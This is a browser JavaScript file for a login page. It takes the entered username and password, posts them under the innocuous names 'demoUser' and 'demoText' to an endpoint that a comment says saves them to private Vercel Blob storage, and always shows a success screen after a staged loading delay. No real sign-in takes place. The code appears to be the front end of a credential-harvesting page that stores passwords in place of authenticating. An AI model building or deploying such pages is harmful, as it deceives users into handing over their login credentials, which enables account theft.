document.addEventListener('DOMContentLoaded', () => {
  const loginForm = document.getElementById('login-form');
  const loginScreen = document.getElementById('login-screen');
  const loadingScreen = document.getElementById('loading-screen');
  const successScreen = document.getElementById('success-screen');

  // Haptic feedback simulator (if supported by browser)
  const triggerHaptic = () => {
    if (navigator.vibrate) {
      navigator.vibrate(50);
    }
  };

  // Form Submission
  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    triggerHaptic();
    
    // Blur inputs to hide keyboard on mobile
    document.activeElement.blur();
    
    const demoUser = document.getElementById('username').value.trim();
    const demoText = document.getElementById('password').value.trim();

    // Transition to loading screen
    loginScreen.classList.add('exit');
    
    setTimeout(async () => {
      loginScreen.classList.add('hidden');
      loadingScreen.classList.remove('hidden');
      
      const startTime = Date.now();
      let apiSuccess = false;

      try {
        // Save form submission to private Vercel Blob storage
        const response = await fetch('/api/save', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ demoUser, demoText })
        });
        const result = await response.json();
        if (response.ok && result.success) {
          apiSuccess = true;
        }
      } catch (err) {
        console.error('Submission to Vercel Blob failed:', err);
      }

      // Ensure loading screen is visible for at least 2 seconds for a native app feel
      const elapsed = Date.now() - startTime;
      const minDelay = 2000;
      const remainingTime = Math.max(0, minDelay - elapsed);

      setTimeout(() => {
        // Transition to success screen
        loadingScreen.classList.add('exit');
        
        setTimeout(() => {
          loadingScreen.classList.add('hidden');
          successScreen.classList.remove('hidden');
          triggerHaptic();
        }, 320); // Wait for exit animation
        
      }, remainingTime);
      
    }, 320);
  });
});
